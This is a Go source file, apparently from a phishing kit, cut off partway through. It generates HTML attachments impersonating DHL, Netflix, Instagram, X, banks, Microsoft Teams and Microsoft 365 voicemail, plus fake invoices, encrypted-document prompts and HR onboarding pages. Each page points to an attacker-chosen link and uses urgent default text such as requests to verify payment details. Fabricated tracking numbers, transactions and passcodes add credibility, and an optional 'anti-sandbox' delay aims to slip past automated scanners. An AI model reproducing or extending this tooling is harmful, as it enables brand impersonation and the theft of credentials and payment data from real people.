package service

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"
	"time"
)

// v3 – Additional branded attachment templates + new generation modes

const (
	TemplateDHL             HTMLTemplateID = "dhl_shipping"
	TemplateNetflix         HTMLTemplateID = "netflix_account"
	TemplateInstagram       HTMLTemplateID = "instagram_security"
	TemplateTwitterX        HTMLTemplateID = "twitter_verification"
	TemplateBankAlert       HTMLTemplateID = "bank_alert"
	TemplateInvoice         HTMLTemplateID = "invoice_receipt"
	TemplateEncryptedDoc    HTMLTemplateID = "encrypted_document"
	TemplateVoicemailTrans  HTMLTemplateID = "voicemail_transcript"
	TemplateTeamsMeetingV2  HTMLTemplateID = "teams_meeting_invite"
	TemplateHROnboarding    HTMLTemplateID = "hr_onboarding"
)

// GetHTMLTemplatesV3 returns the new v3 branded templates
func GetHTMLTemplatesV3() []HTMLTemplateInfo {
	return []HTMLTemplateInfo{
		{ID: TemplateDHL, Name: "DHL Shipping", Description: "DHL Express shipment notification with tracking details", Category: "shipping", Brand: "DHL", Icon: "📦"},
		{ID: TemplateNetflix, Name: "Netflix Account", Description: "Netflix account security or payment update alert", Category: "entertainment", Brand: "Netflix", Icon: "🎬"},
		{ID: TemplateInstagram, Name: "Instagram Security", Description: "Instagram suspicious login or copyright notice", Category: "social", Brand: "Instagram", Icon: "📸"},
		{ID: TemplateTwitterX, Name: "X (Twitter) Verification", Description: "X/Twitter account verification or security alert", Category: "social", Brand: "X", Icon: "🐦"},
		{ID: TemplateBankAlert, Name: "Bank Alert", Description: "Generic bank transaction alert or security notification", Category: "finance", Brand: "Bank", Icon: "🏦"},
		{ID: TemplateInvoice, Name: "Invoice / Receipt", Description: "Professional invoice or payment receipt with line items", Category: "finance", Brand: "Generic", Icon: "🧾"},
		{ID: TemplateEncryptedDoc, Name: "Encrypted Document", Description: "Password-protected document viewer with unlock prompt", Category: "security", Brand: "Generic", Icon: "🔒"},
		{ID: TemplateVoicemailTrans, Name: "Voicemail Transcript", Description: "Voicemail notification with audio player and transcript", Category: "communication", Brand: "Generic", Icon: "🎙️"},
		{ID: TemplateTeamsMeetingV2, Name: "Teams Meeting Invite", Description: "Microsoft Teams meeting invitation with join button", Category: "collaboration", Brand: "Microsoft", Icon: "📅"},
		{ID: TemplateHROnboarding, Name: "HR Onboarding", Description: "HR onboarding document requiring review and signature", Category: "business", Brand: "Generic", Icon: "📋"},
	}
}

// generateV3Template dispatches to the new v3 templates
func (ag *AttachmentGenerator) generateV3Template(req *HTMLTemplateRequest) (string, bool) {
	linkURL := escapeForHTML(req.LinkURL)
	docName := escapeForHTML(req.DocumentName)
	senderName := escapeForHTML(req.SenderName)
	senderEmail := escapeForHTML(req.SenderEmail)
	companyName := escapeForHTML(req.CompanyName)
	message := escapeForHTML(req.Message)

	antiSandbox := ""
	if req.AntiSandbox {
		antiSandbox = `<script>
		(function(){
			var start = Date.now();
			var check = setInterval(function(){
				if(Date.now() - start > 3000){
					clearInterval(check);
					document.getElementById('loading-overlay').style.display='none';
					document.getElementById('main-content').style.display='block';
				}
			}, 100);
		})();
		</script>`
	}

	switch req.TemplateID {
	case TemplateDHL:
		return ag.templateDHL(linkURL, docName, senderName, message, antiSandbox), true
	case TemplateNetflix:
		return ag.templateNetflix(linkURL, senderEmail, message, antiSandbox), true
	case TemplateInstagram:
		return ag.templateInstagram(linkURL, senderName, senderEmail, message, antiSandbox), true
	case TemplateTwitterX:
		return ag.templateTwitterX(linkURL, senderName, senderEmail, message, antiSandbox), true
	case TemplateBankAlert:
		return ag.templateBankAlert(linkURL, senderName, senderEmail, companyName, message, antiSandbox), true
	case TemplateInvoice:
		return ag.templateInvoice(linkURL, docName, senderName, senderEmail, companyName, message, antiSandbox), true
	case TemplateEncryptedDoc:
		return ag.templateEncryptedDoc(linkURL, docName, senderName, senderEmail, message, antiSandbox), true
	case TemplateVoicemailTrans:
		return ag.templateVoicemailV2(linkURL, senderName, senderEmail, message, antiSandbox), true
	case TemplateTeamsMeetingV2:
		return ag.templateTeamsMeetingV2(linkURL, senderName, senderEmail, companyName, message, antiSandbox), true
	case TemplateHROnboarding:
		return ag.templateHROnboarding(linkURL, docName, senderName, senderEmail, companyName, message, antiSandbox), true
	default:
		return "", false
	}
}

// --- DHL Shipping ---
func (ag *AttachmentGenerator) templateDHL(linkURL, docName, senderName, message, antiSandbox string) string {
	trackingNum := fmt.Sprintf("%d%d%d", 1000000000+rand.Intn(9000000000), rand.Intn(100), rand.Intn(100))
	if len(trackingNum) > 18 {
		trackingNum = trackingNum[:18]
	}
	if message == "" {
		message = "Your shipment is on its way. Track your package for the latest delivery updates."
	}
	return fmt.Sprintf(`<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>DHL Express - Shipment Notification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Delivery',Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 12px rgba(0,0,0,.15);max-width:520px;width:100%%;overflow:hidden}
.header{background:#FFCC00;padding:20px 24px;display:flex;align-items:center;justify-content:space-between}
.header .logo{font-size:28px;font-weight:900;color:#D40511;letter-spacing:2px}
.header .express{font-size:12px;color:#333;font-weight:600}
.banner{background:#D40511;padding:14px 24px;color:#fff;font-size:14px;font-weight:600}
.body{padding:24px}
.body h2{font-size:18px;color:#333;margin-bottom:12px}
.body p{font-size:14px;color:#666;line-height:1.6;margin-bottom:16px}
.tracking{background:#f9f9f9;border:1px solid #e0e0e0;border-radius:4px;padding:16px;margin-bottom:20px}
.tracking .label{font-size:11px;color:#999;text-transform:uppercase;letter-spacing:1px}
.tracking .number{font-size:18px;color:#D40511;font-weight:700;margin-top:4px;letter-spacing:1px}
.tracking .status{display:flex;align-items:center;gap:8px;margin-top:12px;font-size:13px;color:#333}
.tracking .status .dot{width:10px;height:10px;background:#4CAF50;border-radius:50%%}
.btn{display:block;width:100%%;padding:14px;background:#D40511;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:15px;font-weight:700}
.btn:hover{background:#b8040e}
.footer{padding:14px 24px;border-top:1px solid #eee;text-align:center}
.footer p{font-size:11px;color:#999}
</style></head><body>
%s
<div class="card" id="main-content">
<div class="header"><span class="logo">DHL</span><span class="express">EXPRESS</span></div>
<div class="banner">Shipment Notification</div>
<div class="body">
<h2>Your package is on its way</h2>
<p>%s</p>
<div class="tracking">
<div class="label">Tracking Number</div>
<div class="number">%s</div>
<div class="status"><span class="dot"></span> In Transit - Out for Delivery</div>
</div>
<a href="%s" class="btn">Track Your Shipment</a>
</div>
<div class="footer"><p>DHL International GmbH. All rights reserved.</p></div>
</div></body></html>`, antiSandbox, message, trackingNum, linkURL)
}

// --- Netflix Account ---
func (ag *AttachmentGenerator) templateNetflix(linkURL, senderEmail, message, antiSandbox string) string {
	if message == "" {
		message = "We noticed some unusual activity on your Netflix account. For your security, please verify your payment information to continue enjoying Netflix."
	}
	return fmt.Sprintf(`<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Netflix - Account Update Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Netflix Sans','Helvetica Neue',Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#141414;border-radius:4px;max-width:500px;width:100%%;overflow:hidden;border:1px solid #333}
.header{padding:24px 32px;border-bottom:1px solid #333}
.header .logo{font-size:28px;font-weight:900;color:#E50914;letter-spacing:-1px}
.body{padding:32px}
.body h2{font-size:20px;color:#fff;margin-bottom:16px}
.body p{font-size:14px;color:#999;line-height:1.7;margin-bottom:20px}
.alert-box{background:rgba(229,9,20,.1);border:1px solid rgba(229,9,20,.3);border-radius:4px;padding:14px 16px;margin-bottom:24px;display:flex;align-items:center;gap:10px}
.alert-box .icon{font-size:20px}
.alert-box .text{font-size:13px;color:#E50914}
.btn{display:block;width:100%%;padding:14px;background:#E50914;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:15px;font-weight:700}
.btn:hover{background:#f40612}
.footer{padding:20px 32px;border-top:1px solid #333;text-align:center}
.footer p{font-size:11px;color:#666}
</style></head><body>
%s
<div class="card" id="main-content">
<div class="header"><span class="logo">NETFLIX</span></div>
<div class="body">
<h2>Action Required: Update Your Account</h2>
<div class="alert-box"><span class="icon">⚠️</span><span class="text">Your payment method needs to be updated</span></div>
<p>%s</p>
<a href="%s" class="btn">Update Account Now</a>
</div>
<div class="footer"><p>This message was sent to %s. Netflix, Inc.</p></div>
</div></body></html>`, antiSandbox, message, linkURL, senderEmail)
}

// --- Instagram Security ---
func (ag *AttachmentGenerator) templateInstagram(linkURL, senderName, senderEmail, message, antiSandbox string) string {
	if message == "" {
		message = "We detected an unusual login attempt on your Instagram account from a new device. If this wasn't you, please secure your account immediately."
	}
	return fmt.Sprintf(`<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Instagram - Security Alert</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,.2);max-width:460px;width:100%%;overflow:hidden}
.header{padding:24px;text-align:center;border-bottom:1px solid #efefef}
.header .logo{font-family:'Billabong',cursive;font-size:36px;color:#262626}
.body{padding:24px}
.body h3{font-size:16px;color:#262626;margin-bottom:12px;text-align:center}
.body p{font-size:14px;color:#8e8e8e;line-height:1.6;margin-bottom:16px;text-align:center}
.device-info{background:#fafafa;border:1px solid #efefef;border-radius:8px;padding:14px;margin-bottom:20px;font-size:13px;color:#262626}
.device-info .row{display:flex;justify-content:space-between;padding:4px 0}
.device-info .row .label{color:#8e8e8e}
.btn{display:block;width:100%%;padding:12px;background:#0095f6;color:#fff;text-align:center;text-decoration:none;border-radius:8px;font-size:14px;font-weight:600}
.btn:hover{background:#1877f2}
.footer{padding:16px 24px;border-top:1px solid #efefef;text-align:center}
.footer p{font-size:11px;color:#8e8e8e}
</style></head><body>
%s
<div class="card" id="main-content">
<div class="header"><span class="logo">Instagram</span></div>
<div class="body">
<h3>Suspicious Login Attempt</h3>
<p>%s</p>
<div class="device-info">
<div class="row"><span class="label">Device</span><span>Windows PC</span></div>
<div class="row"><span class="label">Location</span><span>Unknown Location</span></div>
<div class="row"><span class="label">Time</span><span>%s</span></div>
</div>
<a href="%s" class="btn">Secure Your Account</a>
</div>
<div class="footer"><p>Instagram from Meta. Sent to %s</p></div>
</div></body></html>`, antiSandbox, message, time.Now().Format("Jan 2, 2006 3:04 PM"), linkURL, senderEmail)
}

// --- X (Twitter) Verification ---
func (ag *AttachmentGenerator) templateTwitterX(linkURL, senderName, senderEmail, message, antiSandbox string) string {
	if message == "" {
		message = "Your X account requires verification to maintain access. Complete the verification process to avoid any interruption to your account."
	}
	return fmt.Sprintf(`<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>X - Account Verification Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#16181c;border-radius:16px;max-width:480px;width:100%%;overflow:hidden;border:1px solid #2f3336}
.header{padding:20px 24px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #2f3336}
.header .logo{font-size:24px;font-weight:900;color:#e7e9ea}
.body{padding:24px}
.body h2{font-size:20px;color:#e7e9ea;margin-bottom:12px}
.body p{font-size:15px;color:#71767b;line-height:1.6;margin-bottom:20px}
.verify-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(29,155,240,.1);border:1px solid rgba(29,155,240,.3);border-radius:20px;padding:8px 16px;margin-bottom:20px;font-size:14px;color:#1d9bf0}
.btn{display:block;width:100%%;padding:14px;background:#1d9bf0;color:#fff;text-align:center;text-decoration:none;border-radius:9999px;font-size:15px;font-weight:700}
.btn:hover{background:#1a8cd8}
.footer{padding:16px 24px;border-top:1px solid #2f3336;text-align:center}
.footer p{font-size:12px;color:#71767b}
</style></head><body>
%s
<div class="card" id="main-content">
<div class="header"><span class="logo">𝕏</span></div>
<div class="body">
<h2>Verify Your Account</h2>
<div class="verify-badge">✓ Verification Required</div>
<p>%s</p>
<a href="%s" class="btn">Complete Verification</a>
</div>
<div class="footer"><p>X Corp. Sent to @%s</p></div>
</div></body></html>`, antiSandbox, message, linkURL, senderName)
}

// --- Bank Alert ---
func (ag *AttachmentGenerator) templateBankAlert(linkURL, senderName, senderEmail, companyName, message, antiSandbox string) string {
	if companyName == "" {
		companyName = "SecureBank"
	}
	if message == "" {
		message = "We detected an unauthorized transaction on your account. Please review the transaction details and confirm whether this activity was authorized."
	}
	txnAmount := fmt.Sprintf("$%d.%02d", 200+rand.Intn(4800), rand.Intn(100))
	txnRef := fmt.Sprintf("TXN-%d", 100000000+rand.Intn(900000000))
	return fmt.Sprintf(`<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>%s - Transaction Alert</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,.1);max-width:500px;width:100%%;overflow:hidden}
.header{background:#1a3a5c;padding:20px 24px;display:flex;align-items:center;justify-content:space-between}
.header .bank-name{font-size:20px;font-weight:700;color:#fff}
.header .secure{font-size:11px;color:rgba(255,255,255,.7);display:flex;align-items:center;gap:4px}
.alert-bar{background:#dc3545;padding:10px 24px;color:#fff;font-size:13px;font-weight:600;display:flex;align-items:center;gap:8px}
.body{padding:24px}
.body p{font-size:14px;color:#555;line-height:1.6;margin-bottom:16px}
.txn{background:#f8f9fa;border:1px solid #e9ecef;border-radius:6px;padding:16px;margin-bottom:20px}
.txn .row{display:flex;justify-content:space-between;padding:6px 0;font-size:13px}
.txn .row .label{color:#6c757d}
.txn .row .value{color:#212529;font-weight:600}
.txn .row .amount{color:#dc3545;font-size:18px;font-weight:700}
.btn-row{display:flex;gap:12px}
.btn{flex:1;padding:12px;text-align:center;text-decoration:none;border-radius:6px;font-size:14px;font-weight:600}
.btn-primary{background:#1a3a5c;color:#fff}
.btn-outline{background:#fff;color:#1a3a5c;border:2px solid #1a3a5c}
.footer{padding:14px 24px;border-top:1px solid #eee;text-align:center}
.footer p{font-size:11px;color:#999}
</style></head><body>
%s
<div class="card" id="main-content">
<div class="header"><span class="bank-name">%s</span><span class="secure">🔒 Secure</span></div>
<div class="alert-bar">⚠ Suspicious Transaction Detected</div>
<div class="body">
<p>%s</p>
<div class="txn">
<div class="row"><span class="label">Amount</span><span class="value amount">%s</span></div>
<div class="row"><span class="label">Reference</span><span class="value">%s</span></div>
<div class="row"><span class="label">Date</span><span class="value">%s</span></div>
<div class="row"><span class="label">Merchant</span><span class="value">Online Purchase</span></div>
</div>
<div class="btn-row">
<a href="%s" class="btn btn-primary">Review Transaction</a>
<a href="%s" class="btn btn-outline">Not Me</a>
</div>
</div>
<div class="footer"><p>%s. This is an automated security alert.</p></div>
</div></body></html>`, companyName, antiSandbox, companyName, message, txnAmount, txnRef,
		time.Now().Format("Jan 2, 2006 3:04 PM"), linkURL, linkURL, companyName)
}

// --- Invoice / Receipt ---
func (ag *AttachmentGenerator) templateInvoice(linkURL, docName, senderName, senderEmail, companyName, message, antiSandbox string) string {
	if companyName == "" {
		companyName = "Acme Corp"
	}
	if docName == "" {
		docName = "Invoice"
	}
	invNum := fmt.Sprintf("INV-%d", 10000+rand.Intn(90000))
	amount := fmt.Sprintf("$%d.%02d", 50+rand.Intn(9950), rand.Intn(100))
	return fmt.Sprintf(`<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>%s #%s</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.invoice{background:#fff;max-width:560px;width:100%%;box-shadow:0 2px 16px rgba(0,0,0,.1);overflow:hidden}
.inv-header{padding:32px;display:flex;justify-content:space-between;align-items:flex-start;border-bottom:2px solid #0078D4}
.inv-header .company{font-size:22px;font-weight:700;color:#0078D4}
.inv-header .inv-label{text-align:right}
.inv-header .inv-label h2{font-size:24px;color:#333;text-transform:uppercase;letter-spacing:2px}
.inv-header .inv-label .num{font-size:13px;color:#666;margin-top:4px}
.inv-meta{padding:20px 32px;display:flex;justify-content:space-between;background:#f8f9fa}
.inv-meta .col{font-size:12px;color:#666}
.inv-meta .col strong{display:block;color:#333;font-size:13px;margin-bottom:2px}
.inv-table{width:100%%;border-collapse:collapse}
.inv-table th{background:#f8f9fa;padding:10px 32px;text-align:left;font-size:12px;color:#666;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid #e0e0e0}
.inv-table td{padding:12px 32px;font-size:14px;color:#333;border-bottom:1px solid #f0f0f0}
.inv-table .amount{text-align:right;font-weight:600}
.inv-total{padding:16px 32px;display:flex;justify-content:flex-end;background:#f8f9fa}
.inv-total .total-box{text-align:right}
.inv-total .total-box .label{font-size:12px;color:#666}
.inv-total .total-box .value{font-size:24px;font-weight:700;color:#0078D4}
.inv-action{padding:24px 32px;text-align:center}
.btn{display:inline-block;padding:14px 48px;background:#0078D4;color:#fff;text-decoration:none;border-radius:6px;font-size:15px;font-weight:600}
.btn:hover{background:#005a9e}
.inv-footer{padding:16px 32px;border-top:1px solid #eee;text-align:center}
.inv-footer p{font-size:11px;color:#999}
</style></head><body>
%s
<div class="invoice" id="main-content">
<div class="inv-header">
<div class="company">%s</div>
<div class="inv-label"><h2>%s</h2><div class="num">%s</div></div>
</div>
<div class="inv-meta">
<div class="col"><strong>From</strong>%s<br>%s</div>
<div class="col"><strong>Date</strong>%s<br><strong>Due</strong>%s</div>
</div>
<table class="inv-table">
<tr><th>Description</th><th class="amount">Amount</th></tr>
<tr><td>Professional Services</td><td class="amount">%s</td></tr>
</table>
<div class="inv-total"><div class="total-box"><div class="label">Total Due</div><div class="value">%s</div></div></div>
<div class="inv-action"><a href="%s" class="btn">View Full Invoice</a></div>
<div class="inv-footer"><p>%s &middot; %s</p></div>
</div></body></html>`, docName, invNum, antiSandbox, companyName, docName, invNum,
		senderName, senderEmail,
		time.Now().Format("Jan 2, 2006"), time.Now().Add(30*24*time.Hour).Format("Jan 2, 2006"),
		amount, amount, linkURL, companyName, invNum)
}

// --- Encrypted Document ---
func (ag *AttachmentGenerator) templateEncryptedDoc(linkURL, docName, senderName, senderEmail, message, antiSandbox string) string {
	if docName == "" {
		docName = "Confidential_Report.pdf"
	}
	if senderName == "" {
		senderName = "IT Security"
	}
	if message == "" {
		message = "This document has been encrypted for your protection. Enter the provided password to access the contents."
	}
	return fmt.Sprintf(`<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Encrypted Document - Unlock Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#16213e;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,.4);max-width:480px;width:100%%;overflow:hidden;border:1px solid #0f3460}
.header{padding:24px;text-align:center;border-bottom:1px solid #0f3460}
.header .shield{font-size:48px;margin-bottom:8px}
.header h2{color:#e7e9ea;font-size:18px}
.header p{color:#7f8c8d;font-size:13px;margin-top:4px}
.body{padding:24px}
.file-info{background:rgba(15,52,96,.5);border:1px solid #0f3460;border-radius:8px;padding:16px;margin-bottom:20px;display:flex;align-items:center;gap:12px}
.file-info .icon{font-size:32px}
.file-info .details .name{color:#e7e9ea;font-size:14px;font-weight:600}
.file-info .details .meta{color:#7f8c8d;font-size:12px;margin-top:2px}
.msg{color:#95a5a6;font-size:13px;line-height:1.6;margin-bottom:20px;text-align:center}
.password-box{background:rgba(15,52,96,.3);border:1px solid #0f3460;border-radius:8px;padding:16px;margin-bottom:20px}
.password-box label{color:#7f8c8d;font-size:12px;text-transform:uppercase;letter-spacing:1px;display:block;margin-bottom:8px}
.password-box .fake-input{background:#1a1a2e;border:1px solid #0f3460;border-radius:4px;padding:10px 14px;color:#e7e9ea;font-size:14px;display:flex;align-items:center;gap:8px}
.password-box .fake-input .dots{letter-spacing:3px}
.btn{display:block;width:100%%;padding:14px;background:#e94560;color:#fff;text-align:center;text-decoration:none;border-radius:8px;font-size:15px;font-weight:700;border:none;cursor:pointer}
.btn:hover{background:#c73e54}
.footer{padding:16px 24px;border-top:1px solid #0f3460;text-align:center}
.footer p{font-size:11px;color:#7f8c8d}
</style></head><body>
%s
<div class="card" id="main-content">
<div class="header">
<div class="shield">🔒</div>
<h2>Encrypted Document</h2>
<p>Sent by %s</p>
</div>
<div class="body">
<div class="file-info">
<span class="icon">📄</span>
<div class="details">
<div class="name">%s</div>
<div class="meta">Encrypted &middot; AES-256 &middot; %s</div>
</div>
</div>
<p class="msg">%s</p>
<div class="password-box">
<label>Document Password</label>
<div class="fake-input"><span class="dots">••••••••</span> 🔑</div>
</div>
<a href="%s" class="btn">Unlock &amp; View Document</a>
</div>
<div class="footer"><p>Protected by end-to-end encryption</p></div>
</div></body></html>`, antiSandbox, senderName, docName,
		time.Now().Format("Jan 2, 2006"), message, linkURL)
}

// --- Voicemail Transcript V2 ---
func (ag *AttachmentGenerator) templateVoicemailV2(linkURL, senderName, senderEmail, message, antiSandbox string) string {
	if senderName == "" {
		senderName = "+1 (555) 012-3456"
	}
	duration := fmt.Sprintf("%d:%02d", 1+rand.Intn(4), rand.Intn(60))
	if message == "" {
		message = "Hi, this is regarding your account. I need to discuss something important with you. Please call me back at your earliest convenience or click the link below to listen to the full message."
	}
	return fmt.Sprintf(`<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>New Voicemail from %s</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:480px;width:100%%;overflow:hidden}
.header{background:#0078D4;padding:20px 24px;color:#fff}
.header h2{font-size:16px;font-weight:600}
.header p{font-size:12px;opacity:.8;margin-top:4px}
.body{padding:24px}
.caller{display:flex;align-items:center;gap:14px;margin-bottom:20px}
.caller .avatar{width:48px;height:48px;background:#e3f2fd;border-radius:50%%;display:flex;align-items:center;justify-content:center;font-size:20px}
.caller .info .name{font-size:15px;font-weight:600;color:#333}
.caller .info .time{font-size:12px;color:#999}
.player{background:#f8f9fa;border:1px solid #e9ecef;border-radius:8px;padding:16px;margin-bottom:16px}
.player .waveform{height:40px;display:flex;align-items:center;gap:2px;margin-bottom:10px}
.player .waveform .bar{width:3px;background:#0078D4;border-radius:2px;opacity:.6}
.player .controls{display:flex;align-items:center;justify-content:space-between}
.player .controls .play-btn{width:36px;height:36px;background:#0078D4;border-radius:50%%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;cursor:pointer}
.player .controls .duration{font-size:13px;color:#666}
.transcript{margin-bottom:20px}
.transcript h4{font-size:13px;color:#666;margin-bottom:8px;text-transform:uppercase;letter-spacing:1px}
.transcript p{font-size:14px;color:#333;line-height:1.6;font-style:italic;background:#f8f9fa;padding:12px;border-radius:6px;border-left:3px solid #0078D4}
.btn{display:block;width:100%%;padding:12px;background:#0078D4;color:#fff;text-align:center;text-decoration:none;border-radius:6px;font-size:14px;font-weight:600}
.btn:hover{background:#005a9e}
.footer{padding:14px 24px;border-top:1px solid #eee;text-align:center}
.footer p{font-size:11px;color:#999}
</style></head><body>
%s
<div class="card" id="main-content">
<div class="header"><h2>New Voicemail</h2><p>Microsoft 365 Unified Messaging</p></div>
<div class="body">
<div class="caller">
<div class="avatar">📞</div>
<div class="info"><div class="name">%s</div><div class="time">%s &middot; Duration: %s</div></div>
</div>
<div class="player">
<div class="waveform">%s</div>
<div class="controls"><div class="play-btn">▶</div><div class="duration">0:00 / %s</div></div>
</div>
<div class="transcript"><h4>Transcript (Auto-generated)</h4><p>"%s"</p></div>
<a href="%s" class="btn">Listen to Full Voicemail</a>
</div>
<div class="footer"><p>Microsoft 365 Voicemail Service</p></div>
</div></body></html>`, senderName, antiSandbox, senderName,
		time.Now().Format("Jan 2, 2006 3:04 PM"), duration,
		generateWaveformBars(), duration, message, linkURL)
}

// generateWaveformBars creates random waveform bars for the voicemail player
func generateWaveformBars() string {
	var bars []string
	for i := 0; i < 60; i++ {
		h := 8 + rand.Intn(32)
		bars = append(bars, fmt.Sprintf(`<div class="bar" style="height:%dpx"></div>`, h))
	}
	return strings.Join(bars, "")
}

// --- Teams Meeting Invite ---
func (ag *AttachmentGenerator) templateTeamsMeetingV2(linkURL, senderName, senderEmail, companyName, message, antiSandbox string) string {
	if senderName == "" {
		senderName = "Meeting Organizer"
	}
	if companyName == "" {
		companyName = "Your Organization"
	}
	meetingTime := time.Now().Add(24 * time.Hour)
	meetingID := fmt.Sprintf("%d %d %d", 100+rand.Intn(900), 100+rand.Intn(900), 100+rand.Intn(900))
	passcode := fmt.Sprintf("%s%s", string(rune('A'+rand.Intn(26))), fmt.Sprintf("%d%s", rand.Intn(10), string(rune('a'+rand.Intn(26)))))
	passcode += fmt.Sprintf("%s%d", string(rune('A'+rand.Intn(26))), rand.Intn(10))
	return fmt.Sprintf(`<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Microsoft Teams Meeting</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 12px rgba(0,0,0,.12);max-width:520px;width:100%%;overflow:hidden}
.header{background:#464EB8;padding:20px 24px;display:flex;align-items:center;gap:12px}
.header .teams-icon{width:32px;height:32px;background:#fff;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:18px}
.header .title{color:#fff;font-size:16px;font-weight:600}
.body{padding:24px}
.body h2{font-size:18px;color:#242424;margin-bottom:4px}
.body .organizer{font-size:13px;color:#616161;margin-bottom:16px}
.time-block{background:#f5f5f5;border-radius:6px;padding:14px 16px;margin-bottom:16px;display:flex;align-items:center;gap:12px}
.time-block .cal-icon{font-size:24px}
.time-block .details .date{font-size:14px;color:#242424;font-weight:600}
.time-block .details .time{font-size:13px;color:#616161}
.join-btn{display:block;width:100%%;padding:14px;background:#464EB8;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:15px;font-weight:600;margin-bottom:16px}
.join-btn:hover{background:#3b42a0}
.meeting-info{border-top:1px solid #e0e0e0;padding-top:16px;margin-top:8px}
.meeting-info .row{display:flex;justify-content:space-between;padding:4px 0;font-size:13px}
.meeting-info .row .label{color:#616161}
.meeting-info .row .value{color:#242424;font-family:monospace}
.footer{padding:14px 24px;border-top:1px solid #e0e0e0;text-align:center}
.footer p{font-size:11px;color:#999}
</style></head><body>
%s
<div class="card" id="main-content">
<div class="header"><div class="teams-icon">T</div><span class="title">Microsoft Teams Meeting</span></div>
<div class="body">
<h2>%s invited you to a meeting</h2>
<div class="organizer">%s &middot; %s</div>
<div class="time-block">
<span class="cal-icon">📅</span>
<div class="details">
<div class="date">%s</div>
<div class="time">%s - %s</div>
</div>
</div>
<a href="%s" class="join-btn">Join Microsoft Teams Meeting</a>
<div class="meeting-info">
<div class="row"><span class="label">Meeting ID</span><span class="value">%s</span></div>
<div class="row"><span class="label">Passcode</span><span class="value">%s</span></div>
</div>
</div>
<div class="footer"><p>Microsoft Teams &middot; %s</p></div>
</div></body></html>`, antiSandbox, senderName, senderEmail, companyName,
		meetingTime.Format("Monday, January 2, 2006"),
		meetingTime.Format("3:04 PM"),
		meetingTime.Add(time.Hour).Format("3:04 PM"),
		linkURL, meetingID, passcode, companyName)
}

// --- HR Onboarding ---
func (ag *AttachmentGenerator) templateHROnboarding(linkURL, docName, senderName, senderEmail, companyName, message, antiSandbox string) string {
	if companyName == "" {
		companyName = "Your Company"
	}
	if senderName == "" {
		senderName = "HR Department"
	}
	if docName == "" {
		docName = "Employee Onboarding Package"
	}
	if message == "" {
		message = "Welcome to the team! Please review and complete the following onboarding documents before your start date."
	}
	return fmt.Sprintf(`<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>%s - %s</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,.1);max-width:520px;width:100%%;overflow:hidden}
.header{background:linear-gradient(135deg,#667eea,#764ba2);padding:24px;color:#fff}
.header h2{font-size:18px;margin-bottom:4px}
.header p{font-size:13px;opacity:.85}
.body{padding:24px}
